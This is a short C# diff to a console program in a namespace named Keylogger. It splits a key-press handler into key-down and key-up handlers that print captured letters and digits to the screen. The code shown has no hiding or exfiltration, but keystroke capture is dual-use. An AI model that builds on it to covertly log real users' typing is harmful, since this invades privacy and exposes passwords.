@@ -18,17 +18,27 @@ namespace Keylogger
             Task CatherTask = Task.Factory.StartNew(() =>
             {
                 catcher = new Catcher(20);
-                catcher.KeyPressed += KeyPressed;
+                catcher.KeyDown += KeyDown;
+                catcher.KeyUp += KeyUp;
                 catcher.Start();
             });
             waitHandle.WaitOne();
         }
 
-        static void KeyPressed(Keys key)
+        static void KeyDown(Keys key)
         {
             KeysConverter kc = new KeysConverter();
             string keyChar = kc.ConvertToString(key);
-            Console.Write(keyChar);
+            if(char.IsLetterOrDigit(keyChar[0]))
+                Console.WriteLine(keyChar + " - Down");
+        }
+
+        static void KeyUp(Keys key)
+        {
+            KeysConverter kc = new KeysConverter();
+            string keyChar = kc.ConvertToString(key);
+            if (char.IsLetterOrDigit(keyChar[0]))
+                Console.WriteLine(keyChar + " - Up");
         }
     }
 }
